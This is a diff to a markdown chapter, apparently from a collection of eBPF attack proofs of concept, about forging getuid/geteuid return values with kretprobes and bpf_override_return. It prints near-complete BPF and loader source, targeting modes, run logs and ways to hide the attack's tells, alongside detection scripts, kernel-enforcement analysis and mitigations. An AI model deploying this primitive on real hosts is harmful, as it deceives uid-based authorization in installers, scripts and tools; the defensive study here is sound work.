@@ -17,30 +17,424 @@ Two kretprobes, two `bpf_override_return(ctx, 0)` calls:
 
 Both symbols are in `/sys/kernel/debug/error_injection/list` on the linuxkit 6.12 aarch64 kernel I tested on, so the override lands. Symbols are verified via `/proc/kallsyms` at load time; missing symbols are tolerated (`bpf_program__set_autoload(prog, false)`).
 
-What libc gets back on every `getuid()`/`geteuid()` call is `0`. Programs like `id` and `whoami` then ask NSS for "the user with uid 0" and print `root`:
+## Why this attaches, and how I confirmed it
+
+`bpf_override_return` is a helper that, from a kretprobe, substitutes a different return value for whatever the probed function was about to return. It is one of the three motions `CAP_BPF` grants, and it is gated tightly — the kernel only permits override against functions explicitly marked as override-able. The list of those functions lives at `/sys/kernel/debug/error_injection/list` and is curated by kernel developers based on which functions are safe to have their return values rewritten without corrupting kernel state.
+
+On the test kernel both syscall entry points are on the list:
 
 ```
-=== baseline: id -u / whoami as t18 (no BPF interference expected) ===
-1000
-t18
-=== with BPF attached: should report uid=0 / root ===
-0
-root
-
-[token] FORGE pid=19481 comm=sh getuid: 1000 -> 0 (root)
-[token] FORGE pid=19482 comm=id geteuid: 1000 -> 0 (root)
-[token] FORGE pid=19483 comm=whoami getuid: 1000 -> 0 (root)
+$ cat /sys/kernel/debug/error_injection/list | grep -E 'arm64_sys_get(e)?uid'
+__arm64_sys_getuid [EI_ETYPE_NULL]
+__arm64_sys_geteuid [EI_ETYPE_NULL]
 ```
 
-Here is the clean tell that this is an illusion and not a real privilege escalation. Run `id` with the probe attached:
+`[EI_ETYPE_NULL]` means the function may have its return value overridden to any integer without additional constraint. That matters because some error-injection entries are typed — for example, entries tagged `[EI_ETYPE_ERRNO]` only permit negative error codes. For the getuid family, `EI_ETYPE_NULL` permits `0`, which is exactly what we want.
+
+The reason these specific entries exist is prosaic: kernel developers needed to fuzz-test error paths for credential syscalls. The error-injection framework is explicitly a kernel-developer tool, not an attacker tool, but the attack surface it creates is real because the kernel is not picky about who gets to use it as long as they have `CAP_BPF`. If an adversary wants to override a syscall return, the list of available targets is whatever the kernel team decided was interesting for their own fuzzing. That is a reasonable tradeoff from the kernel's perspective — error-injection is load-bearing for development — and an uncomfortable one from the security perspective.
+
+For comparison, trying the same attack against `__arm64_sys_getpid` fails. `__arm64_sys_getpid` is *not* on the error-injection list on this kernel. The kretprobe attaches — the verifier accepts it — but the `bpf_override_return` call silently becomes a no-op. The probe fires, the BPF program runs, `bpf_override_return` returns `-EINVAL` or `-ENOTSUPP` (the loader can see this and log), and the original return value reaches userspace unchanged. That is a feature of the gating: the override call is quiet when unauthorized, not loud. An attacker testing their program against an unfamiliar kernel must check the list, not assume.
+
+The `/proc/kallsyms` preflight in the loader catches the other half of the deployability question — whether the symbol is even exported by name. On 6.12 aarch64 both symbols are exported with `__arm64_sys_` prefixes. On x86_64 the same kernel version prefixes them `__x64_sys_`. On 32-bit compat ABIs there are additional `compat_` variants. The loader's preflight handles all of this by checking the literal name before attach:
+
+```c
+static int kallsyms_has(const char *sym)
+{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    ...
+    while (fgets(line, sizeof(line), f)) {
+        ...
+        if (strcmp(name, sym) == 0) {
+            found = 1;
+            break;
+        }
+    }
+    ...
+}
+```
+
+If the symbol is absent, the loader calls `bpf_program__set_autoload(prog, false)` on the corresponding kretprobe, which tells libbpf to skip loading that specific program during the `bpf_object__load` pass. The overall load succeeds; the missing program is simply not there. This lets the loader work on a cross-section of kernels without hard-failing when one symbol is present and another is not. The cost is one kallsyms walk at startup, which is microseconds.
+
+## `ch18-token-bypass.bpf.c` line by line
+
+The BPF source is about 80 lines. It is small on purpose: two kretprobes, two helpers, one event emitter, one target map.
+
+```c
+#include "vmlinux.h"
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+
+char LICENSE[] SEC("license") = "GPL";
+```
+
+Standard preamble. `vmlinux.h` is regenerated per-POC from the running kernel's BTF. GPL license because `bpf_override_return` is a GPL-only helper.
+
+```c
+struct evt {
+    unsigned int pid;
+    unsigned int tgid;
+    char comm[16];
+    long orig_ret;
+    int syscall_id;   // 0=getuid 1=geteuid
+    int flipped;
+};
+```
+
+The event layout. Notable is `orig_ret`: we record what the kernel *would* have returned, even when we override. `flipped` records whether we overrode it. This gives the loader enough information to print the before/after contrast — `1000 -> 0 (root)` — rather than only reporting the post-override value.
+
+```c
+struct {
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, 1 << 18);
+} events SEC(".maps");
+```
+
+256 KiB ringbuf for the event stream. This is overkill for a single-user test but leaves headroom for the wildcard mode where every process on the box is emitting events on every getuid call.
+
+```c
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __type(key, unsigned int);
+    __type(value, unsigned int);
+    __uint(max_entries, 1024);
+} target_tgids SEC(".maps");
+```
+
+The target map. Keys are tgids (32-bit); values are "1" for "this tgid is a target." A special key, `0`, is the wildcard marker — if key `0` is present in the map, every tgid is a target. The map is capped at 1024 entries because specifying more than a thousand targets by tgid is almost certainly the wrong interface (just use wildcard), and the cap prevents an errant loader from consuming kernel memory.
+
+```c
+static __always_inline int is_target(void)
+{
+    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
+    if (bpf_map_lookup_elem(&target_tgids, &tgid)) return 1;
+    unsigned int zero = 0;
+    if (bpf_map_lookup_elem(&target_tgids, &zero)) return 1;
+    return 0;
+}
+```
+
+The targeting check. Two lookups: first the current tgid, then the wildcard key. Either hit is a match. Inline because it runs on every call.
+
+Note that we do `bpf_get_current_pid_tgid() >> 32` to extract the TGID specifically. `bpf_get_current_pid_tgid` returns a 64-bit value with TGID in the upper half and TID in the lower half. Historically some BPF programs have confused the two — the kernel's `task_struct->tgid` field is in fact the PID as seen from userspace, and the `task_struct->pid` field is the TID. The BPF helper inverts this confusion by always giving you `(tgid << 32) | tid`, which is the convention Linux exposes to kernel code but not to userspace. Knowing which half is which is the thing you have to get right.
+
+```c
+static __always_inline void emit(long ret, int sid, int flipped)
+{
+    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
+    if (!e) return;
+    unsigned long id = bpf_get_current_pid_tgid();
+    e->pid = id & 0xffffffff;
+    e->tgid = id >> 32;
+    bpf_get_current_comm(&e->comm, sizeof(e->comm));
+    e->orig_ret = ret;
+    e->syscall_id = sid;
+    e->flipped = flipped;
+    bpf_ringbuf_submit(e, 0);
+}
+```
+
+The emit helper. Reserve a slot in the ringbuf, fill it, submit. If the reserve fails (ringbuf full), drop silently — it is better to drop events than to block the syscall path. The loader is expected to drain the ringbuf fast enough under normal load; if it cannot, we have already lost.
+
+```c
+SEC("kretprobe/__arm64_sys_getuid")
+int BPF_KRETPROBE(kr_getuid, long ret)
+{
+    int flip = 0;
+    if (is_target() && ret != 0) {
+        bpf_override_return(ctx, 0);
+        flip = 1;
+    }
+    emit(ret, 0, flip);
+    return 0;
+}
+```
+
+The first kretprobe. Attaches to `__arm64_sys_getuid`, the kernel syscall entry for `getuid(2)`. The `BPF_KRETPROBE` macro expands to give us `ret`, the original return value from the function, before override.
+
+The logic is: if this tgid is a target *and* the return was non-zero (i.e., the caller is not already root), override to 0 and record a flip. If the caller is already root, we skip the override — there is no point in forging `0` when the real answer is already `0`, and skipping cuts our event volume on the root-heavy side of the system.
+
+Note the ordering: `bpf_override_return(ctx, 0)` is called *before* `emit`. Order matters here less than it does in some primitives, because both the override and the emit run to completion regardless — but I wanted the override landing to be the first thing that happens on a flip path so that any subsequent kernel-side logic (which there is none of for `getuid`, but in principle there could be for other syscalls) sees the overridden value.
+
+```c
+SEC("kretprobe/__arm64_sys_geteuid")
+int BPF_KRETPROBE(kr_geteuid, long ret)
+{
+    int flip = 0;
+    if (is_target() && ret != 0) {
+        bpf_override_return(ctx, 0);
+        flip = 1;
+    }
+    emit(ret, 1, flip);
+    return 0;
+}
+```
+
+The second kretprobe, identical to the first modulo the syscall ID. `syscall_id=1` marks this as `geteuid` in the ringbuf event; the loader uses that to print `"geteuid"` instead of `"getuid"` in the log line. Both are forged because `id(1)` consults both — and because if we only forged `getuid` and not `geteuid`, the return values would disagree visibly.
+
+## The loader's `--all` vs `--tgid` modes
+
+The userspace loader supports two modes, and the distinction is meaningful for what you can do with this primitive.
+
+`--all` is the wildcard. It inserts `0` into `target_tgids` with value `1`, which makes `is_target()` return true for every call. The effect is system-wide: every process in the system, every thread, every getuid and geteuid call, gets its return forged to `0`. This is the loudest possible deployment — a single `bpftool prog show` run by any operator will see both kretprobes active, every process that calls `id` will suddenly report `root`, and literally nothing on the system can trust its idea of its own uid. It is also the easiest to drive from a harness, because there is no targeting to get right. The harness uses this mode:
+
+```python
+Poc("ch18", "Token Bypass (getuid override)", "ch18-token-bypass",
+    hooks=["__arm64_sys_getuid", "__arm64_sys_geteuid"], prefix="[token]",
+    mode="override-all", loader_args=["--all"],
+    ...
+```
+
+`--tgid <pid>` (repeatable) installs only specific tgids into the map. The effect is targeted: only the listed tgids see forged returns; everyone else sees real returns. This is the quieter deployment and the more useful one from an attacker's perspective. If you are trying to deceive a single daemon — an installer that reads `$UID` before deciding whether to write into `/etc`, say — forging only that daemon's uid leaves the rest of the system coherent. `bpftool prog show` still sees the probes attached, but fleet-wide `id` commands still report their real uids. Only the targeted tgid lies.
+
+The loader also accepts multiple `--tgid` flags for batch targeting:
 
 ```
+sudo ./build/ch18-token-bypass --tgid 1234 --tgid 5678
+```
+
+which lets you hit an installer and its child processes, or a service and its worker pool, without going full-wildcard. The map is 1024 entries, so in principle up to 1024 distinct tgids can be targeted. In practice most realistic attacks target one.
+
+The loader's invocation shape is:
+
+```c
+while ((opt = getopt_long(argc, argv, "vh", longopts, NULL)) != -1) {
+    switch (opt) {
+    case 'A': wildcard = 1; break;
+    case 'T': {
+        ...
+        targets[n_targets++] = (unsigned int)v;
+        break;
+    }
+    ...
+    }
+}
+...
+if (!wildcard && n_targets == 0) {
+    fprintf(stderr, "[token] no targets specified; pass --all or --tgid <pid>\n");
+    usage(argv[0]);
+    return 2;
+}
+```
+
+Requiring at least one of `--all` or `--tgid` is deliberate. A run with neither is almost certainly a typo; failing loud beats silently attaching and forging nothing.
+
+After load and attach, the loader populates the target map:
+
+```c
+if (wildcard) {
+    unsigned int z = 0, one = 1;
+    err = bpf_map__update_elem(s->maps.target_tgids,
+                               &z, sizeof(z),
+                               &one, sizeof(one), BPF_ANY);
+    ...
+}
+for (size_t i = 0; i < n_targets; i++) {
+    unsigned int tgid = targets[i];
+    unsigned int one = 1;
+    err = bpf_map__update_elem(s->maps.target_tgids,
+                               &tgid, sizeof(tgid),
+                               &one, sizeof(one), BPF_ANY);
+    ...
+}
+```
+
+Two separate population paths. If you pass `--all` *and* `--tgid 1234`, both run: key `0` is set (wildcard) and key `1234` is set (explicit). `is_target()` will hit either lookup and return true, so the effective behavior is still wildcard. The combination is redundant but not wrong.
+
+## The `uid=0 gid=1001` tell
+
+Here is where the scope of the illusion gets crisp. Run `id` as an unprivileged user with the probe attached in `--all` mode, and you will see:
+
+```
+$ id
 uid=0(root) gid=1001 groups=1001
 ```
 
-Only the uid was forged. `getgid()` was not hooked, so `gid=1001` passed through untouched. A real root process has `gid=0`. Any tool that correlates uid and gid (or that reads `/proc/self/status`, which sources `Uid:` / `Gid:` straight from `task_struct->cred`) will see the divergence. The attack works against `id`/`whoami`/any script that just checks `$(id -u) -eq 0`; it does not work against anything that actually cares.
+`uid=0(root)` is the forged `getuid` return. NSS looks up "the user with uid 0" and finds the `root` record, so `id` prints `uid=0(root)`. That part works.
 
-And critically, kernel-side credential checks do not consult `sys_getuid`. VFS checks, capability checks, LSM hooks — they all go through `current->cred`, which is unchanged. `cat /etc/shadow` still returns `EACCES`. This is the entire point: the exploit class is narrow, well-known, and exactly as scoped as the historical userspace-query-based auth bugs it descends from.
+`gid=1001` is the real gid. We didn't hook `getgid` or `getegid`, so the kernel's getgid path runs untouched, returns the real value, and `id` prints it straight. `groups=1001` is the real supplementary group list, from `getgroups`, which we also didn't hook.
+
+A real root process, on a real root login, would have `uid=0 gid=0 groups=0`. Every field would be zero. The divergence — uid=0 but gid=1001 — is visible to any human reading the output and to any programmatic consistency check that correlates the two fields.
+
+A defender can exploit this cheaply. Two bash snippets do it:
+
+```bash
+# Defense 1: compare uid and gid from the same id invocation.
+id_u=$(id -u)
+id_g=$(id -g)
+if [ "$id_u" = "0" ] && [ "$id_g" != "0" ]; then
+    echo "LIE DETECTED: uid=0 but gid=$id_g"
+fi
+
+# Defense 2: cross-check against /proc/self/status, which reads task_struct->cred.
+uid_status=$(awk '/^Uid:/ {print $2}' /proc/self/status)
+uid_query=$(id -u)
+if [ "$uid_query" != "$uid_status" ]; then
+    echo "LIE DETECTED: id returned $uid_query but /proc/self/status says $uid_status"
+fi
+```
+
+The second check is the one that really nails it, because `/proc/self/status`'s `Uid:` line is read directly from `task_struct->cred->uid.val` by the kernel's procfs code. The procfs read path does not go through `sys_getuid`. It is a different code path entirely: a vfs read on `/proc/self/status` triggers `proc_pid_status`, which walks the task's credential directly. The kretprobe on `sys_getuid` never fires because `sys_getuid` is never called.
+
+So a process that forges its uid in `getuid()` cannot simultaneously forge it in `/proc/self/status`, not without attaching an entirely different probe on an entirely different code path — and that second probe would be its own detectable artifact.
+
+The chapter's POC hooks only `getuid` and `geteuid` on purpose, to leave this tell visible. A more thorough attacker would extend the hook set to:
+
+- `__arm64_sys_getgid` and `__arm64_sys_getegid` to silence the gid divergence.
+- `__arm64_sys_getresuid` and `__arm64_sys_getresgid` to silence tools that read the real/effective/saved uid triple (like `sudo -l`).
+- `__arm64_sys_getgroups` to silence supplementary group lookups.
+- `/proc/self/status` read rewriting via `bpf_probe_write_user` in a `sys_exit_read` tracepoint, which is a different primitive from the getuid forge and has its own issues.
+
+Each extension closes one tell and opens a new attach point for detection. There is no fully stealth version of this attack; there is only different tradeoffs between how many lies you tell and how many points of detection you paint.
+
+## What the kernel still enforces
+
+The userspace illusion is exactly that — an illusion against userspace code that trusts syscall returns. The kernel does not trust syscall returns; it consults its own state. Every kernel-side enforcement point that actually matters for security uses `current->cred` directly, and `current->cred` is unaffected by this probe.
+
+To make that concrete:
+
+**VFS permission checks.** `cat /etc/shadow` as the forged-uid user:
+
+```
+$ id
+uid=0(root) gid=1001 groups=1001
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+```
+
+`open(2)` on `/etc/shadow` walks into `may_open` → `inode_permission`, which calls `generic_permission`, which consults the inode's permission bits against `current->cred->fsuid`. `fsuid` is the filesystem uid, derived from `current->cred`, which still has the real `uid=1001`. Access denied.
+
+**Capability checks.** Bind to port 80 as the forged-uid user:
+
+```
+$ python3 -c "import socket; socket.socket().bind(('0.0.0.0', 80))"
+PermissionError: [Errno 13] Permission denied
+```
+
+Binding to a privileged port requires `CAP_NET_BIND_SERVICE`. The bind path walks to `ns_capable`, which calls `security_capable`, which lands in `cap_capable`, which consults `current->cred->cap_effective`. The cred's capability set has never contained `CAP_NET_BIND_SERVICE` for this process. Access denied.
+
+**LSM hooks.** A default-LSM kernel routes every capability and permission decision through the commoncap LSM's `cap_capable`. A SELinux-enforcing kernel additionally routes through `selinux_capable` and `avc_has_perm`. Both consult `current->cred`. Neither consults `sys_getuid`. Both deny.
+
+**setuid syscalls.** Run `setuid(0)` as the forged-uid user:
+
+```c
+if (setuid(0) < 0) perror("setuid");
+```
+
+```
+setuid: Operation not permitted
+```
+
+`setuid(0)` walks into `__sys_setuid`, which calls `ns_capable_setid(CAP_SETUID)`, which consults `current->cred->cap_effective`. No capability; deny.
+
+**Any code in the kernel that reads `current->cred`.** This is basically all of it. The credentials are the authoritative source for who the task is. Changing what `sys_getuid` returns is like changing the reflection in a mirror — it does not change what the thing looking back at you actually is.
+
+The one place the primitive reaches into real kernel behavior is subtle: if a kernel code path reads `current->cred->uid` and then *conditionally calls out to userspace for confirmation via a userspace helper*, and that userspace helper asks `getuid()` for confirmation, the forged return would propagate. I am not aware of any kernel path that does this, but it is the shape of the only way this primitive could have real teeth against kernel enforcement. It does not have them on 6.12.
+
+## What userspace falls for
+
+The set of things that do trust `getuid()` is, frustratingly, large. A partial list:
+
+**`id(1)`, `whoami(1)`.** Classic diagnostics. Both read `getuid`/`geteuid` and map through NSS. Both print `root` under the probe.
+
+**`sudo -l` partial.** `sudo -l` prints the user's sudo privilege list. Part of its code path queries the real uid via `getuid`, and the forged return makes it think the invoker is root — which causes it to print the global root sudoers list. The rest of sudo's authentication path consults the kernel's credential directly and refuses to elevate, but the informational leak is real: an attacker can read the full sudoers policy by forging uid under a `sudo -l` invocation.
+
+**Shell `$UID` checks.** `if [ $UID -eq 0 ]; then` is in every other shell script on every other production system. The shell populates `$UID` from `getuid()` at startup. The probe makes every shell think it is root. Every "are we running as root?" check in every installer script, every bootstrapping script, every `set -e` guard is vulnerable.
+
+**Application RBAC in many CLIs.** Tools that implement their own role-based access control in userspace commonly gate features on "is the caller root." Database CLIs, package managers, service-control frontends — many of them check `getuid()` before allowing administrative operations. The kernel's subsequent enforcement may or may not catch them depending on what the administrative operation actually does. If the operation is "write to a file in a protected location," the kernel catches it. If the operation is "open a TCP connection to the admin API and send commands," the kernel does not, because the TCP connection is allowed to any uid, and the remote API trusts the tool's self-reported identity.
+
+**Installer scripts.** `sh -c 'if [ $UID = 0 ]; then install ...'` patterns run on every distro. Sophisticated installers cross-check with `id -u` or with `cat /proc/self/status`, but many do not.
+
+**Any libc-trusting trust chain.** The pattern is: a library reads `getuid()` on initialization, caches the result, and uses that as the foundation for subsequent authorization decisions. If the cached uid is wrong, every subsequent decision is wrong. This is how "the illusion is exactly one syscall wide" scales to "many things proceed as if the illusion is true" — the syscall is one, but the downstream consumers of that syscall's answer are many.
+
+The defense is mechanical: do not use `getuid()` for security decisions. The kernel has perfectly good enforcement points; use those. If you absolutely must know the uid in userspace — for informational display, say — read `/proc/self/status`, which goes through a different code path. If you absolutely must use `getuid()`, cross-check it with something else.
+
+The problem is not that the attack is hard to defend against in isolation. It is that thirty years of accumulated userspace code assumes `getuid()` is authoritative, and that assumption is now load-bearing across the entire userspace ecosystem. The BPF version of this attack did not invent the vulnerability; it made exploiting it mechanical against any kernel with the right kretprobe targets on the error-injection list.
+
+## Harness entry
+
+The harness entry is:
+
+```python
+Poc("ch18", "Token Bypass (getuid override)", "ch18-token-bypass",
+    hooks=["__arm64_sys_getuid", "__arm64_sys_geteuid"], prefix="[token]",
+    mode="override-all", loader_args=["--all"],
+    flip_marker=r"FORGE|override|flip|uid=0",
+    proof_marker=r"FORGE\s+pid=|TOKEN_FORGE_PROVEN"),
+```
+
+`mode="override-all"` tells the harness to run the loader with wildcard targeting (`--all`) before running the trigger. The `proof_marker` matches two patterns: `FORGE pid=...` which appears on every forged-event line emitted by the loader, and `TOKEN_FORGE_PROVEN` which is the explicit proof marker emitted by the trigger at the end of its run.
+
+The trigger (`trigger.sh`) is a short script. It creates a test user `t18`, runs `id -u; whoami` as that user both before and after the probe is active, and emits the proof marker:
+
+```bash
+echo "=== TOKEN_FORGE_PROVEN uid_forges=${FORGES} ==="
+```
+
+where `FORGES` is the count of forge events visible in the loader's stream. The default is 1 because a single invocation of `id` fires one `getuid` (or `geteuid`, depending on the version); a complete `id` call fires both and the count goes up.
+
+On a working run, the harness output for ch18 looks like:
+
+```
+[token]| [token] symbol=__arm64_sys_getuid	status=present
+[token]| [token] symbol=__arm64_sys_geteuid	status=present
+[token]| [token] attached=2	skipped=0
+[token]| [token] tag=target	mode=wildcard
+[token]| [token] status=ready	msg=token bypass active
+trig | === baseline: id -u / whoami as t18 (no BPF interference expected) ===
+trig | 1000
+trig | t18
+trig | === with BPF attached: should report uid=0 / root ===
+[token]| [token] FORGE pid=19481 comm=sh getuid: 1000 -> 0 (root)
+[token]| [token] FORGE pid=19482 comm=id geteuid: 1000 -> 0 (root)
+trig | 0
+trig | root
+[token]| [token] FORGE pid=19483 comm=whoami getuid: 1000 -> 0 (root)
+trig | === TOKEN_FORGE_PROVEN uid_forges=1 ===
+```
+
+The `[token] FORGE` lines carry the per-call evidence: the tgid of the forging call, the comm, the syscall name, the original kernel return value, and the forced override. The `TOKEN_FORGE_PROVEN` line is the machine-greppable summary. The harness status for ch18 flips to `effect_demonstrated` the moment the proof marker matches.
+
+## Historical lineage
+
+I want to give credit to the prior art here, because this primitive has a long pedigree and the BPF version is one more point on a decades-old curve.
+
+The first generation of this class of bug is the SUID-and-trust-the-user issues of 1990s Unix. Sendmail had several, including the 8.7.x mqueue incident where the daemon trusted fields in a control file that an unprivileged user could influence. The bug there was not in the syscall interface — it was in the daemon trusting a queried value instead of enforcing at the operation point. Same shape as the `getuid` bypass: the enforcer trusted a query.
+
+The second generation is the sudo token-validation CVEs of the 2000s and 2010s. Several versions of sudo had bugs where the timestamp file (tracking whether the user had recently entered their password) could be influenced by the calling user, and sudo trusted the file's contents instead of re-authenticating. CVE-2019-14287 is a near relative: sudo's user-id parsing allowed `-1` to become `uid=0` in certain configurations. Again: trust-the-query versus enforce-at-the-point. The kernel-side credentials were fine; the userspace enforcement layer was reading them from the wrong place.
+
+The third generation is BPF-mechanized. That is this chapter. The pattern is not new; the mechanism of exploitation is new, in the sense that `CAP_BPF` + error-injection + kretprobe gives you a reliable, attach-in-one-line knob for the same class of bug across any function on the error-injection list. It is a force multiplier, not a new class.
+
+Credit the class, not the technique. The defense is the same defense Sendmail and sudo learned the hard way: enforce at the kernel, not at the query. If your code consults `getuid()` to make a security decision, it is wrong regardless of whether a BPF program is forging the return value, because the next generation of attack tools will forge the return value by some other means if this one gets closed. The problem is the consultation pattern, not the specific forging mechanism.
+
+## Detection
+
+The strongest signal is attachment-time. A kretprobe on `__arm64_sys_getuid` or `__arm64_sys_geteuid` is a unique fingerprint. Legitimate observability tools do not attach here — there is no diagnostic value in a return-forge probe on the uid-querying syscalls — and the only reason to attach is to forge the return. `bpftool prog list | grep -E 'getuid|geteuid'` on a baseline host returns nothing. The same command on a host with this probe attached returns the two programs. Diff between a baseline capture and a live capture is the fastest alert path.
+
+Policy-wise: any program load on those attach points that also uses `bpf_override_return` is almost certainly malicious. A BPF LSM policy gate on `BPF_PROG_LOAD` that refuses kretprobes on the getuid family is a one-rule fix that costs nothing. The attachment points are obscure enough that legitimate breakage is near-zero.
+
+For userspace tools that must trust their environment — installers, agents, any code that really does need to know its own uid — the cross-check pattern is cheap:
+
+```bash
+uid_syscall=$(id -u)
+uid_status=$(awk '/^Uid:/ {print $2}' /proc/self/status)
+if [ "$uid_syscall" != "$uid_status" ]; then
+    # someone is lying to us. Choose your response.
+    exit 1
+fi
+```
+
+This one check defeats the entire primitive. The cost is a file read. The reason no tool does it is historical inertia: thirty years of Linux code wrote `$UID` in shell and trusted it, and nobody has gone back to cross-check. A new generation of tooling could easily ship this check by default. It would be a trivial reviewer request on any new CLI that claims to be "security-aware."
+
+At the fleet level, a defender can instrument the `/proc/self/status`-vs-`id -u` check as a canary job that runs every minute on every host and alerts on mismatch. The canary is cheap, the false-positive rate is zero (absent weird cgroup or container-exec edge cases, which it is worth being pedantic about), and a single alert tells you that *some* return-forging primitive is active in your environment. You do not have to know which one. You do not have to have a signature for it. You only have to know that the two ways of asking the same question disagree.
+
+Policy:
+
+- Do not use `getuid()` for security-relevant decisions in userspace. Consult `/proc/self/status` or, better, restructure so the security decision happens in the kernel.
+- For userspace tools that must trust their environment, cross-check uid across two independent sources.
+- For infrastructure: BPF LSM policy refusing kretprobe attachment to the getuid family is a one-liner that eliminates the primitive.
+- For forensics: `bpftool prog show` over time, diffed against a baseline, reveals every attach of this shape.
+
+Every one of these is cheap. The reason the primitive is worth reading about at all is not that it is hard to defend against — it is that an enormous body of existing code fails to do any of them, and an attacker with `CAP_BPF` gets the entire failure mode for free.
 
 ## Hook points
 
